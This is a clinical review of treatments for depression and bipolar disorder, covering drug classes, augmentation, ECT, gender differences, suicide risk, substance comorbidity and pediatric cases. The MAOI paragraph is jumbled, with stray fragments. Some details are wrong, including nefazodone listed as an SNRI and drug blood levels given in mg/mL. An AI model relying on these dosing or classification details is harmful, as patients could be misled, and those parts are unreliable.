Antidepressants appeared during the 1950s and the first one was imipramine introduced by Roland Kuhn. Although a variety of mechanisms have been proposed as responsible for the effectiveness of antidepressants, it seems that increasing the serotonin signal in the limbic system is what eventually survives as a concept. The role of norepinephrine seems to be important too, since its depletion cancels the effectiveness of antidepressants. 

The major classes of antidepressant agents are:

*Tricyclics (TCAs): Tricyclic antidepressants are the oldest class of antidepressant drugs. This group includes imipramine, clomipramine, amitryptiline, nortriptyline and desipramine. They act by blocking the reuptake of a number of neurotransmitters including serotonin, norepinephrine and dopamine. Their side effects include increased heart rate, drowsiness, dry mouth, constipation, urinary retention, blurred vision, dizziness, cognitive disorder, confusion, skin rash, weight gain or loss and sexual dysfunction. TCAs can be lethal at overdose (over ten times the therapeutic dosage) usually due to cardiac arrhythmia. However, TCAs are highly effective and are still used especially in severe and refractory depression in spite of the development of newer agents which are safer and with fewer side effects. 

*MonoAminOxidase Inhibitors (MAOIs) and Reversible Inhibitors of Monoamineoxidase A (RIMA):   reversible&quot; forms affecting only the MAO-A subtype Monoamine oxidase inhibitors (MAOIs) such as phenelzine (Nardil) may be used if other antidepressant medications are ineffective. Because there are potentially fatal interactions between this class of medication and certain foods (particularly those containing Tyramine), red wine, as well as certain drugs, classic MAOIs are rarely prescribed anymore. MAOIs work by blocking the enzyme monoamine oxidase which breaks down the neurotransmitters dopamine, serotonin, and norepinephrine (noradrenaline). MAOIs can be as effective as tricyclic antidepressants, although they can have a higher incidence of dangerous side effects (as a result of inhibition of cytochrome P450 in the liver). A new generation of MAOIs has been introduced; moclobemide (Manerix), known as a reversible inhibitor of monoamine oxidase A (RIMA), acts in a more short-lived and selective manner and does not require a special diet. Additionally, (selegiline) marketed as Emsam in a transdermal form is not a classic MAOI in that at moderate dosages it tends to affect MAO-B which does not require any dietary restrictions. As one of the side effects is weight gain and could be extreme. block the break-down of monoamine neurotransmitters (serotonin and norepinephrine) by inhibiting the enzymes which oxidize them, thus leaving higher levels still active in the brain (synaptic cleft). liver inflammation, heart attack, stroke, and seizures. Serotonin syndrome is a side effect of MAOIs when combined with certain medications

*Selective Serotonin Reuptake Inhibitors (SSRIs):  This class of antidepressants appeared in 1988 and includes fluoxetine, paroxetine, sertraline, citalopram and escitalopram and fluvoxamine. It acts presumably by selectively inhibiting the reuptake (by the presynaptic neuron) of serotonin (also known as 5-hydroxytryptamine, or 5-HT). In this way the synaptic levels of 5-HT increase. SSRIs typically have fewer side effects and a more favorable profile in comparison to the TCAs but also in comparison to other classes of antidepressants. Their adverse effects include headache, anxiety, insomnia, nervousness, decreased appetite, decreased libido, drowsiness, dry mouth and serotonin syndrome. There is some data suggesting SSRIs might not be as efficient as other classes especially in more severe cases of depression. Recently the Food and Drug Administration (FDA) has included a Black Box warnings on all SSRIs suggesting an increased like hood for suicidality in children and adolescents who are prescribed these drugs, although subsequent analysis and ecological studies consider this warning to be exaggerated and in some countries might already have led to an increase of the suicidal rate.

*Serotonin Norepinephrine Reuptake Inhibitors (SNRIs):  This is a new group that includes venlafaxine, duloxetine, milnacipram, nefazodone and maybe mirtazapine. These agents inhibit the reuptake of both the 5-HT and norepinephrine. Their side effect profile is more or less similar to that of the SSRIs. After acute discontinuation a withdrawal syndrome could occur. Some data suggest they are as class stronger than the SSRIs.

*Noradrenergic and specific serotonergic antidepressants (NASSAs):  This group includes only mirtazapine and mianserin, and suggests it works through the increase of norepinephrine and 5-HT neurotransmission by blocking presynaptic alpha-2 adrenergic receptors while simultaneously minimizes 5-HT related side-effects by blocking specific serotonin receptors. The side effects include the typical SNRI side effects but also include a more pronounced drowsiness, increased appetite, and significant weight gain.

*Norepinephrine (noradrenaline) reuptake inhibitors (NRIs): This group includes reboxetine which exerts its effect via norepinephrine.

*Norepinephrine-dopamine reuptake inhibitors (NDRIs): This group includes bupropion which inhibits the reuptake of dopamine and norepinephrine.

The overall efficacy of antidepressants is well proven (Baghai, Volz, &amp; Moller, 2006; M. Bauer, Whybrow, Angst, Versiani, &amp; Moller, 2002a, 2002b; Bauer et al. 2007) and although recent meta-analysis question their true clinical usefulness (Kirsch et al. 2008), antidepressants constitute the only rigorously tested therapy against depression and their clinical utility is the only one solidly proven (Nutt &amp; Malizia, 2008; Nutt &amp; Sharpe, 2008). 
      
Apart from antidepressants, other classes of psychotropic agents could be used to treat the constellation of symptoms that accompany depression as well as comorbid conditions. The most often used agents are anxiolytics, tranquillizers and sedatives. Usually benzodiazepines serve this role; however they induce tolerance and dependence. The alternative is pregabalin, which is officially labeled for the treatment of generalized anxiety, and atypical low-potency antipsychotics like quetiapine and olanzapine. Antipsychotics (either typical or atypical) are also prescribed when psychotic symptoms are present. Their side effects include extrapyramidal signs and symptoms, blurred vision, tardive dyskinesia, loss of libido and weight gain. 
      
The therapeutic effect against depression, no matter whether the patient is under monotherapy or combination therapy takes at least two weeks to become evident. There is a number of theories that try to explain it, suggesting that the &quot;down-regulation&quot; of neurotransmitter receptors, or second (post-synaptic intracellular) messenger system alterations or the medium term modulation of neuronal plasticity might be the neurobiological mechanisms underlying the treatment effect. Unfortunately the therapeutic effect of antidepressants does not typically persist more than 36 months after discontinuation and the relapse rate is high and depends on the phase of the disease. It is reported than within the first year, if patients are left without treatment, around 50% of them will relapse if the remitted depressive episode was their first, around 75% if it was the second and maybe up to 90% if it was their third. Thus for those patients with a history of multiple episodes, relapse is almost certain and lifetime treatment necessary (Frank et al. 1990; Kupfer et al. 1992). International guidelines suggest at least 6 months of continuation antidepressant treatment after the full resolution of the index episode and if the patient is young and the episode was the first or second. For patients with history of episodes treatment should last at least 5 years if not indefinitely.
      
Regardless of the initial choice of antidepressant, at least 30% of patients will not respond to treatment sufficiently. Clinical impression and recent reports suggest that if there is no response after 3-4 weeks a change of treatment is necessary. Increasing the dosage is one reasonable option since it obviously affects clinical outcome but also increases the adverse effect burden. The maximum dosage recommended by regulatory authorities limits this option. Various alternative treatment strategies have been proposed for these non- or partially responsive depressions, and close work with the patient might produce favorable results. Research is in the way to identify genetic markers predictive of response or useful in the choice of treatment. 
      
The options to treat patients that do not  respond adequately to treatment with an antidepressant after 3-4 weeks include the following:

a. Increase the dosage to the highest tolerated or permitted by labeling.

b. Switch to another antidepressant within the same pharmacologic class. Research suggests that failure to tolerate or respond to one medication does not imply failure with other medications.

c. Switch to another agent from a different class of antidepressants gives a 30-50% chance of response (Rush et al. 2006; Thase et al. 2007). 

d. Combining two antidepressants from different classes (McGrath et al. 2006)

e. Augmenting the antidepressant with other agents (e.g., lithium, psychostimulants or thyroid hormone)(Bauer et al. 2002a, 2002b)(Nierenberg et al. 2006)) 

f. Combining the antidepressant with a psychotherapeutic intervention (Thase et al. 2007). 
      
Lithium is well investigated in placebo-controlled trials with positive results and is considered to be the best proven augmentation therapy (Bauer et al. 2002a, 2002b). Aripiprazole is also approved as adjunct therapy on antidepressants for the treatment refractory depression (Hellerstein et al. 2008). Other augmentation options include thyroid hormones (Nierenberg et al. 2006) and psychostimulants (amphetamine, methylphenidate or modafinil) but sometimes they seem to trigger manic or mixed episodes in patients suffering from bipolar disorder and this is particularly problematic to predict when the patient is pseudo-unipolar, that is a manic episode had not been present before. Anticonvulsants are used for patients with alcohol or substance abuse as well as for emotionally labile patients. These patients should not be given stimulants, as they exacerbate mood shifting and put the patient at a risk for abuse. A very frequent practice for refractory patients is the use of combination strategy which involves adding one or more additional antidepressants, usually from different classes. It is expected to use multiple and diverse neurochemical effects to boost treatment; however there is little data to support this practice.

===== Bipolar Disorder =====

The treatment of BD is complex and full of caveats for the clinician (Fountoulakis et al. 2005; Fountoulakis, Grunze, Panagiotidis, &amp; Kaprinis, 2007; Fountoulakis, Magiria et al. 2007; Fountoulakis, Vieta et al. 2007). An important problem is that a specific and different treatment needs to be considered separately for manic, hypomanic, mixed and bipolar depression episodes. The first step demands all offending drugs (e.g., stimulants, illicit drugs, caffeine, and sedative-hypnotic agents) should gradually be discontinued, and circadian disruptions and sleep loss minimized. 
      
Today several structured psychoeducational programs exist for patients with bipolar disorder. Hard data concerning the effectiveness of psychosocial interventions in BD are emerging and concern the prophylactic efficacy of cognitive therapy (Ball et al. 2006),  family-focused therapy, interpersonal and social rhythm therapy, and cognitive behavior therapy (Miklowitz et al. 2007) and psychoeducation (Colom, Vieta, Martinez-Aran et al. 2003; Colom, Vieta, Reinares et al. 2003; Colom et al. 2004; Colom et al. 2005; Reinares et al. 2004; Scott, Colom, &amp; Vieta, 2006). However, it seems that these modalities are effective only in a selective sample of patients with a rather more benign form of the illness.
      
The most well known are the following: 

a. The behavioral family-management techniques developed by David J. Miklowitz and Michael J. Goldstein which include 21 one-hour sessions after the resolution of the acute phase. They promote  family education,  communication and problem-solving skills.

b. Monica R. Basco and A. John Rush developed a highly structured three-phase program targeting at educating the patient,  teaching cognitive-behavioral skills for coping with symptoms and psychosocial stressors, improving compliance and monitoring the course of the illness. 

c. The psychoeducational program developed by Eduar Vieta and Fransesc Colom has similar goals, is highly structured and lasts approximately one year after the resolution of the acute phase. It seems that patients at an earlier stage of the illness have a better prognosis after attending it.

d. Social rhythm interpersonal psychotherapy: This intervention intergrates an interpersonal approach with an effort to stabilize  daily activities, especially sleep, eating and working hours.  

The biological therapy is the hallmark of bipolar disorder which is considered one of the two major psychotic mental disorders (the other being schizophrenia). Classically the treatment of bipolar illness includes the use of the so-called mood stabilizers (lithium and specific anticonvulsants), antipsychotics and antidepressants. 
      
The first effective medication was lithium salts and for a long time they were considered to be a wonder-like drug both for the acute phase and the prophylaxis. However, it was soon abandoned because of cases of toxicity and was considered unsafe. The problem was that in the beginning it was not possible to monitor plasma levels. Latter lithium’s efficacy limitations were evident since half of patients do not respond adequately. Latter, anticonvulsants were proven to be efficacious as well and more recently atypical antipsychotics. The usefulness of antidepressants is somewhat controversial. Several papers with treatment guidelines for BD have been published until today, in an effort to code the way of treatment (Fountoulakis et al. 2005). 
      
Lithium has a well established effectiveness against acute mania (Bowden et al. 1994; Bowden et al. 2005; Keck et al. 2007; Kushner, Khan, Lane, &amp; Olson, 2006) but maybe not against acute depression (Young et al. 2008). The data are far stronger concerning the effectiveness of lithium during the maintainance phase (Bowden et al. 2000; Bowden et al. 2003; Calabrese et al. 2003; Calabrese et al. 2006; Goodwin et al. 2004; Kane et al. 1982). After its discontinuation the likelihood of relapse is very high (50% in the first 5 months and above 80% within the first 18 months). Drawbacks of lithium therapy include its narrow therapeutic index (recommended plasma level 0.8– 1.2 mmol/L), poor tolerability, especially at higher doses, and risk of &quot;rebound mania&quot; on withdrawal (Goodwin, 1994). Common side effects of lithium are tremor, polydipsia, polyuria, and in the long-term, hypothyroidism. However, in spite of these shortcomings, lithium still remains the gold standard of treatment and additionally it might have an antisuicidal effect (Baldessarini et al. 2006; Gonzalez-Pinto et al. 2006). 
      
Of the anticonvulsants, only valproate, carbamazepine and lamotrigine possess data concerning the treatment of bipolar illness. Both valproate and carbamazepine are effective against acute mania (Bowden et al. 1994; Bowden et al. 2006; Pope, McElroy, Keck, &amp; Hudson, 1991; Weisler, Kalali, &amp; Ketter, 2004; Weisler et al. 2005; Weisler et al. 2006) but against acute bipolar depression valproate is effective (Davis, Bartolucci, &amp; Petty, 2005; Ghaemi et al. 2007) while the data concerning carbamazepine are less robust (Ballenger &amp; Post, 1980). The typical dosages for valproic acid are 750-2000 mg daily, with blood concentration 50-120 mg/mL. Rapid oral loading with divalproex using 15 to 20 mg/kg from day 1 of treatment, has been well tolerated and associated with a rapid onset of response. Blood concentrations above 45 mg/mL have also been associated with earlier response. The typical dosages for carbamazepine to treat mania are 600-1800 mg daily and correspond to blood concentrations of 4-12 mg/mL. But for neither agent blood concentrations predict response. An important problem is that after several weeks carbamazepine induces hepatic enzymes thus lowering its levels and requiring an upward dose titration. Lamotrigine seems not to be effective during either the acute manic (unpublished clinical trials) or the acute depressed phase (Goldsmith, Wagstaff, Ibbotson, &amp; Perry, 2003). During the maintenance phase, data are negative for valproate (Bowden et al. 2000), and weak for carbamazepine (Okuma et al. 1981). On the contrary they are strong for lamotrigine but only concerning the prevention of depression (Bowden et al. 2003; Calabrese et al. 2000; Calabrese et al. 2003). The data concerning the other anticonvulsants are either negative (Kushner et al. 2006)  or do not exist, although there are open studies and case reports including complicated cases (Oulis et al. 2007). Valproate is reported to possess a relatively high teratogenicity. Other side effects include weight gain and hair loss and maybe the induction of polycystic ovarian syndrome. A potentially life-threatening side-effect of carbamazepine may be the Steven-Johnson syndrome and related dermatologic effects. Lamotrigine has a moderately high incidence of rash, thus titration should be very slow. 
      
All atypical antipsychotics seem to be effective against acute mania (Fountoulakis &amp; Vieta, 2008) but only quetiapine and the olanzapine plus fluoxetine combination are considered to be effective and thus approved against acute bipolar depression (Calabrese et al. 2005; Thase et al. 2006; Tohen, Vieta et al. 2003). Aripiprazole and olanzapine have sufficient data concerning their efficacy during the maintainance phase (and approved) (Keck, Jr. et al. 2007; McQuade, Sanchez, Marcus, &amp; al, 2004; Tohen et al. 2006), although aripiprazole prevented only manic episodes,  while data on the efficacy of quetiapine during the maintenance phase have been recently announced and approved (Altamura, Salvadori, Madaro, Santini, &amp; Mundo, 2003; Altamura et al. 2008). Typical antipsychotics (haloperidol, chlorpromazine, perphenazine) although seem to posses efficacy against acute mania (McIntyre, Brecher, Paulsson, Huizar, &amp; Mullen, 2005; Shopsin, Gershon, Thompson, &amp; Collins, 1975; Smulevich et al. 2005) they also seem to predispose patients to manifest dysphoria or depression (Tohen, Goldberg et al. 2003; Zarate &amp; Tohen, 2004). Adverse effects of antipsychotics include extrapyramidal symptoms and signs, induction of diabetes mellitus and a metabolic syndrome, sedation, hyperprolactinemia and tardive dyskinesia.
      
Antidepressants should never be used as monotherapy but always together with a mood stabilizer or an atypical antipsychotic, because of the risk to induce the opposite pole, mixed episodes and rapid cycling. Adjunctive studies report that around 14% of bipolar depressed patients under both an antidepressant and a mood stabilizer switch to mania or hypomania (Post et al. 2001; Post et al. 2006). The meta-analysis suggests a higher switch rate for venlafaxine in comparison to SSRIs; however the studies included were randomized trials of adjunctive treatment, maybe including more refractory patients (Leverich et al. 2006). Fluoxetine has a proven efficacy against bipolar depression (Amsterdam et al. 1998; Amsterdam &amp; Shults, 2005a, 2005b; Cohn, Collins, Ashbrook, &amp; Wernicke, 1989) especially in the frame of the combination with olanzapine (E. B. Brown et al. 2006; Tohen, Vieta et al. 2003). 
      
Since in real life the biggest proportion of BD patients do not do well on monotherapy, several combination therapies have been tested and several agents have been tested as an add-on therapeutic option (Fountoulakis &amp; Vieta, 2008).

===== Other Treatment Modalities =====
      
a. Electroconvulsive therapy (ECT) (Daly et al. 2001; Sikdar, Kulhara, Avasthi, &amp; Singh, 1994; Small et al. 1988) could serve as a useful option even in patients who have failed to respond to one or more medications or combined treatment although rigorous data are not available. It can be used both against acute mania and acute depression either unipolar or bipolar. It seems to be effective in both psychotic and nonpsychotic depression, and bilateral ECT is more effective than unilateral, but with more cognitive adverse effects. It is very useful for severely suicidal patients.

b. Transcranial magnetic stimulation (rTMS) (Dolberg, Dannon, Schreiber, &amp; Grunhaus, 2002; Nahas, Kozel, Li, Anderson, &amp; George, 2003; Saba et al. 2004) has shown both some antimanic and antidepressant effects at 20 Hz over the right but not left frontal cortex or at 1 Hz rTMS bifrontally, but the efficacy has not been solidly proven yet. 

c. Light therapy is useful for the treatment of mood disorder with seasonal pattern, either as monotherapy or in combination with medication.

===== Combined Treatment =====

A significant percentage of mood patients are refractory to any monotherapy. Comorbidity and the successful treatment of the comorbid condition is one of the factors connected to treatment resistance (Sharan &amp; Saxena, 1998). In this frame combination treatment is the only reasonable strategy, and it is important to embed the antidepressant therapy into a complex therapeutic approach with multiple modalities. However, relatively few studies have investigated its benefits, and in particular, the combination of psychotherapy with antidepressants does not always provide a solidly proven advantage  (de Maat et al. 2008; Hegerl et al. 2004). 
      
Psychoeducation and psychotherapy may ameliorate the social problems which appear as a consequence of the mood disorder and might improve compliance with mood-stabilizer agents. A formal approach could be that psychotherapy is used to increase adherence, improve the moral and solve interpersonal and social problems, while medications are used for symptom control. Psychotherapy might be added especially after a partial medication response but it is unclear when this should happen, since the evidence suggests that psychosocial and occupational improvements follow response. Thus, routine use of both treatments initially may not be necessary for psychosocial restoration.

=== Special Populations/Gender/Cultural Issues ===
      
===== Gender ===== 
      
Studies have shown that nearly all around the world, women have nearly double rates of depression than men although this is not well documented in non-industrialized cultures (Lloyd &amp; Miller, 1997). The National Comorbidity Study reported that 6% of the females vs. 3.8% of males suffered from a current depressive episode and that 21.3% of women vs. 12.7% of men had a lifetime experience of a depressive episode (D. G. Blazer, Kessler, McGonagle, &amp; Swartz, 1994). The rates for bipolar disorder are similar however, suggesting this difference concerns only unipolar depression. A second finding suggests that women with less social support and experiencing social stressors might be at the greatest risk to develop depression. However, there is no significant gender difference concerning the risk of recurrence, thus suggesting that gender is among the risk factors for initiating depressive symptoms but not among those determining the course and outcome. This higher risk for females is present around the age of 20s until the early 30s and that the rates of first onset before (childhood and adolescence) or after that age (middle age, elderly) are similar for both sexes (Nazroo, Edwards, &amp; Brown, 1997; Philibert, Richards, Lynch, &amp; Winokur, 1997). 
      
It seems highly unlikely that there a single, sex-related factor which is responsible for the difference. Endocrine changes and differences were being the target of research without convincing results. The role the female reproductive system might play in mental health is still controversial. The fact that the gender difference is not obvious until puberty, and disappears after menopause, supports the idea that there is something specific connecting the female biology to mood disorders. A more advanced approach suggests that this biology is not a risk factor per se; on the contrary it could be responsible for an increased vulnerability to stressors, thus indirectly leading to depression, especially considering the second fact that women are more likely to experience stressful and even threatening life events and are at a higher risk of early sexual abuse and current spousal abuse (Finkelhor, Hotaling, Lewis, &amp; Smith, 1990; Roesler &amp; McKenzie, 1994). They also might use oral contraceptive use, and often experience mood disorders temporally related to their sexual identity (e.g., premenstrual or postpartum-onset mood disorders). Additionally, almost all societies have designated different, unequal roles for women.
      
On the other hand, since no conclusive data are available so far, it is necessary to consider the possibility that men and women share similar rates of depression, but they express depression in different ways and the resulting different rates is in reality a methodological artifact. In this case, it’s reasonable to suggest that different cognitive coping styles between men and women could be responsible for these results and maybe women are more likely to be diagnosed with depression because they seek professional help more often for their depressive symptoms and maybe because they are more sensitive to negative relationships (Phillips &amp; Segal, 1969). It is believed that men might react to emotional distress by trying not to think about it, while women are more likely to ruminate over their problems (Nolen-Hoeksema &amp; Girgus, 1994; Nolen-Hoeksema, Larson, &amp; Grayson, 1999; Nolen-Hoeksema, Stice, Wade, &amp; Bohon, 2007). In this frame, women are more likely to report depressive symptoms due to marital problems than men. This could at least partially be socio-culturally determined, or imposed, since it is reported that the depressed female students who reached out to their friends were met with concerned and nurturing reactions, while in contrasts, the depressed male students who did the same, faced social isolation and often direct rejection, even hostility (Hammen &amp; Peters, 1978; Joiner, Alfano, &amp; Metalsky, 1992). While married, divorced, and separated women were more likely to be depressed than men, widowed men were more likely to be depressed than women and unmarried men and women shared similar rates of depression (Radloff &amp; Rae, 1979). 
      
Another possibility is that in men, but not in women, alcohol abuse could mask an underlying depressive disorder an could account for the difference in the rates. This opinion derives from the observation that alcohol abuse and mood disorders are often inherited in the same family (Triffleman, Marmar, Delucchi, &amp; Ronfeldt, 1995). 
      
===== Suicide =====
      
Today we know that suicide is a complex and multicausal behavior and demands a complex and sophisticated approach. Statistics point to a substantial decline of suicide rates throughout Europe, the US and Canada during the past two decades, and the major reason for that seems to be the better recognition of major depression as well as availability of treatment (Akiskal, Benazzi, Perugi, &amp; Rihmer, 2005; Cipriani, Pretty, Hawton, &amp; Geddes, 2005; Isometsa, Henriksson et al. 1994; Z Rihmer, Belso, &amp; Kiss, 2002; Z. Rihmer &amp; Akiskal, 2006). The understanding and preventing of suicide is one of the most challenging tasks for psychiatry today. It has been confirmed by several psychological autopsy studies that the majority of suicidal victims were suffering from a mood disorder, usually untreated major depression, with frequent comorbidity of anxiety and substance-use disorders (Badawi, Eaton, Myllyluoma, Weimer, &amp; Gallo, 1999; Barraclough, Bunch, Nelson, &amp; Sainsbury, 1974; Henriksson et al. 1993; Monkman, 1987; Rihmer et al. 2002; Rihmer, 2007).  Around 60-80% of all suicide victims are suffering from depression while on the other hand, an estimated 15% of patients with severe major depression eventually die from suicide. The rate of attempted to completed suicide, is about 5 to 1 in patients with any mood disorder (Tondo, Isacsson, &amp; Baldessarini, 2003). 
      
Although many risk factors have been identified, most of them are not clinically useful. An important and useful risk factor is the presence of a depressive mixed state (3 or more simultaneously co-occurring hypomanic symptoms in patients with “unipolar depression”). This clinical picture overlaps to a great extent with agitated depression. Depressive mixed state as well as agitation substantially increase the risk of both attempted and committed suicide (Akiskal, Benazzi et al. 2005; Balazs et al. 2006; Isometsa, Henriksson et al. 1994; Rihmer &amp; Akiskal, 2006; Rihmer, 2007). Other risk factors include family history of suicide, higher number of prior depressive episodes, comorbid anxiety, personality disorders and alcohol dependence, as well as sociodemographic and psycho-social factors such as younger age, being divorced or widowed, and experiencing adverse life-situations which are associated with increased suicidal ideation and higher prevalence of attempts (Balazs et al. 2006; Bernal et al. 2006; Henriksson et al. 1993; Rihmer et al. 2002; Z. Rihmer &amp; Akiskal, 2006; Z. Rihmer, 2007). Although biological research has so far identified several biological correlates of suicide today there is no biological marker found yet to distinguish explicitly between suicidal and non suicidal depressives (Nordstrom et al. 1994; Samuelsson, Jokinen, Nordstrom, &amp; Nordstrom, 2006). 
      
An impressive fact is that in spite of frequent medical contact before committing suicide, only a small minority of victims had received appropriate treatment. This is particularly a problem in primary care, where most patients seek help (Henriksson et al. 1993; Isometsa, Aro, Henriksson, Heikkinen, &amp; Lonnqvist, 1994; Luoma, Martin, &amp; Pearson, 2002; Z. Rihmer, Barsi, Arato, &amp; Demeter, 1990; Rihmer et al. 2002). Thus not only early identification of suicidal behavior is possible but also early intervention is possible and could make a difference. The patient should be put on a plan of regular psychiatric visits on an interval ranging from once to twice weekly. Latter visits could be planned on a month interval or even less frequently. The main factors determining frequency include the clinical picture, social and family support, history of adherence, insight into the illness and the risk and medication adverse effects. The therapist should have in mind that antidepressive agents are the only formally approved treatment for major depression (Akiskal, Benazzi et al. 2005; Z. Rihmer &amp; Akiskal, 2006; Yerevanian, Koek, Feusner, Hwang, &amp; Mintz, 2004) and there are no data supporting the effectiveness of any other approach (Fountoulakis, Gonda, Siamouli, &amp; Rihmer, 2008). Also a marked anti-suicidal effect has been also reported with long-term lithium therapy in bipolar (manic-depressive) patients (J. Angst, Angst, Gerber-Werder, &amp; Gamma, 2005; Cipriani et al. 2005; Rihmer &amp; Akiskal, 2006).
Recently, the U.S. Food and Drug Administration issued a warning concerning the use of antidepressants in children and adolescents and possibly in all age groups because of possible induction of suicidality (thinking and behavior but not completed suicide) by antidepressants in juvenile depressives (FDA, 2009). A similar warning is in place now concerning anticonvulsants. However, the impact of this warning might be robustly negative. 
      
The warnings are based on data from RCTs but there is doubt whether the design of these studies permit these conclusions. A recent study reports that after the warning, (between 2003 and 2005) the SSRIs prescriptions for children and adolescents in the US and the Netherlands decreased by about 22% but simultaneously there was a 49% youth suicide rate increase in the Netherlands (between 2003 and 2005) and a 14% in the US (between 2003 and 2004) (Gibbons et al. 2007). It is highly possible the &quot;natural&quot; population of mood disorders patients does not respond to treatment this way. On the contrary it seems that proper and &quot;aggressive&quot; treatment of mental disorders and especially of major depression aiming at achieving full remission should  always be the target and determines to a large extent whether suicidal behavior is expressed or not (Angst et al. 2005; Moller, 2006; Sondergard, Lopez, Andersen, &amp; Kessing, 2007; Tiihonen et al. 2006). However, a caveat is that the most dangerous period for suicide in a patient is immediately after treatment has commenced, as antidepressants may reduce the symptoms of depression such as psychomotor retardation or lack of motivation before mood starts to improve. Although this appears to be a paradox, studies indicate the suicidal ideation is a relatively common component of the initial phases of improvement even with psychotherapy (Moller, 1992).

===== Substance Use Comorbidity =====

Substance use and abuse is an old problem which recently gained significant importance. A large variety of different substances could be related with use or abuse and consequently with substance-induced mood disorders (Schuckit et al. 1997; Winokur et al. 1998). They include various medications (e.g., anesthetics, anticholinergics, antidepressants, anticonvulsants, antibiotics, antihypertensives, corticosteroids, antiparkinson agents, chemotherapeutic agents, nonsteroidal anti-inflammatory drugs, and disulfiram), toxic agents (heavy metals, industrial solvents, household cleaning agents), or substances used routinely for recreational purposes (e.g., caffeine, nicotine). Almost all the substances are preferred because of their subjective effects which concern mainly the mood. Others are used for their calming or &quot;therapeutic-like&quot; effect (as self-treatment, e.g., alcohol, sedatives) while others for their stimulating, euphoric and augmenting effect (e.g., stimulants). 
      
Substance use and abuse could happen in the frame of a pre-existing mood disorder or the use itself can be the cause of the disorder (because of the direct physiological effects, toxicosis, withdrawal or dependence). When the mood disorder is primary and pre-exists, substance use complicates both the clinical manifestations and the treatment, and might lead to poor prognosis. This is especially often during teenage and early adult years, and relates mainly to cyclothymia and probably represents attempts of self-medication for the mood liability. During the withdrawal period many substances including alcohol, opioids, and sedatives might induce persistent mood disturbance, insomnia and cognitive disorder leading to relapse of the abuse. These symptoms need to be distinguished from those of primary mental disorders, and this is often very difficult. The critical factor is the clinician's judgment that the mood disorder is caused by the substance or not.  A double diagnosis is usually the only reasonable solution. However, the &quot;self-medication&quot; scenario with mood disorder being primary, or even the double diagnosis are unfortunately not the diagnostic priority of many therapists (especially in therapeutic communities) and consequently, the missing of the diagnosis of mood disorder deprives the patient from proper and effective treatment.
      
Alcohol use and abuse is very frequent especially for mood and anxiety patients. On the other hand, heavy alcohol consumption over a period of days results in a depressive state, which even when it is severe, it largely improves within days to weeks of abstinence. After several weeks, most alcoholic patients manifest residual low mood or mood swings resembling a cyclothymic or dysthymic disorder but they also tend to diminish and disappear with time. The presence of the dysthymic symptoms usually indicates the normal course of a withdrawal syndrome and not an independent mood disorder. Nicotine use and abuse is also very frequent usually in the form of cigarette smoking and  withdrawal is manifested by changes in mood, anxiety and weight gain (average is 2 to 3 kg) which can persist even for months. 
      
Amphetamine, cocaine, opioid, hallucinogen or inhalant - induced mood disorder can occur during intoxication or withdrawal. In general, for all this substances, intoxication is associated with manic or mixed mood features, whereas withdrawal is associated with depressive mood features. An induced mood disorder by any of them usually remits within a week or two (several weeks for opioids), except from panic episodes that develop during cocaine use which could persist for many months following cessation (Krystal, Price, Opsahl, Ricaurte, &amp; Heninger, 1992; Weddington et al. 1990). An important outcome is suicide which is not an uncommon complication.

===== Pediatric =====

Although the core features of mood disorders are essentially the same across the life span, traditionally children and the elderly are considered somewhat separately because of the special features their phase of life includes and the way these features might influence the overall manifestation of mental disorders and their treatment. Additionally, an early age of onset of any disorder puts forward the question whether this determines a more severe and chronic disease and also poor response to treatment. 
      
It seems that the developmental phase might influence the expression of certain mood symptoms and that’s why e.g., pervasive anhedonia or significant psychomotor retardation are rare among depressive children and auditory hallucinations and somatic complaints are seen more often in prepubertal children.
      
The incidence of mood disorders among children and adolescents is reported to increase during the last few decades. These reports are rather consistence and they also suggest there is a decrease of the age of onset of mood disorders. The general picture suggests that the prevalence of depression is around 0.3% for pre-school children, 0.4–3% for school aged children and 0.4–6.4% for adolescents; the prevalence of bipolar disorder is 0.2–0.4% in children and 1% in adolescents. Research suggests that 40-70% of children and adolescents with a mood disorder have also at least one comorbid psychiatric disorder. The risk factors as well as the etiopathogenesis for this age group are uncertain. 
      
Concerning suicide and related behavior, the attempted suicide is 1% in children and 1.7–5.9% in adolescents, while the completed suicide rate ranges from nearly zero in children below the age of 10, to a peak of above 18/100,000 in boys 15-19 years old. The data suggest that among 15-19 year-olds, the suicide rates have quadrupled over the last four decades, and the reason for this is not known. Unfortunately, suicide is currently the fourth leading cause of death in children aged 10-15 years and the third leading cause of death among adolescents and young adults aged 15-25 years. The suicidal method is the most significant factor which determines whether the attempt will result in death. The great majority of attempts among children and adolescents have little lethal potential partially because of restricted access to lethal material and inadequate cognitive potential to plan a successful attempt. What is unique in this age group is suicide imitation and contagion. This means that the suicidal behavior increases in adolescents following exposure to well-publicized news stories of suicide or a film involving a teen suicide, but this seems to concern vulnerable individuals and not the age group as a whole (Brent et al. 1993; Cheng, Hawton, Lee, &amp; Chen, 2007; Gould &amp; Shaffer, 1986). 
      
The etiopathogenesis of mood disorders in children and adolescents is not well understood. It is an age group which combines developmental vulnerability and high potency for neuroplastisity and compensation for any insults. It is generally believed that genetic factors play a significant role; however there are vague data in support of this and no clear conclusions can be made. Non-shared environmental factors might also play an important role (Pike &amp; Plomin, 1996). At the cognitive level, the theoretical approach suggests the presence of cognitive distortions similar to those seen in adults but again data are inconsistent and scarce. 
      
Traditionally there has been significant interest on the family interactions and their relationship to the development of depression, but the conditions are usually complicated and difficult to interpret. The most difficult problem is that when the family environment is problematic, then, there is a high probability of a genetic vulnerability in the family and sometimes in both parents. However, this does not exclude the possibility the environment to induce a kind of emotional vulnerability in the child by shaping the early experiences. Depressed parents may model negative cognitive styles and poor self-esteem, leading to a deficit of social problem-solving skills and in coping with stressful life events; marital conflict and lack of an adequate family support system especially when a mental illness of the parent(s) of an early onset, is recurrent, and disrupts parental functioning puts the child at a high risk for any mental disorder but especially for a mood disorder. In this frame, it is understandable why family conflict is the most frequent event adolescents report they experienced, before they manifest suicidal behavior. There are several studies suggesting that depressed children and adolescents might experience more stressful life events like interpersonal losses, problems in relationships, parental divorce, bereavement, physical abuse and suicide in the environment (Beautrais, Joyce, &amp; Mulder, 1997; Gould, Shaffer, Fisher, &amp; Garfinkel, 1998; Kaplan, Pelcovitz, Salzinger, Mandel, &amp; Weiner, 1997; Williamson, Birmaher, Anderson, al-Shabbout, &amp; Ryan, 1995).
      
The conclusion concerning the etiopathogenesis of mood disorders in children and adolescence is that genetics clearly plays at least a moderate role while both shared and non-shared environmental influences appear to be also important.  
      
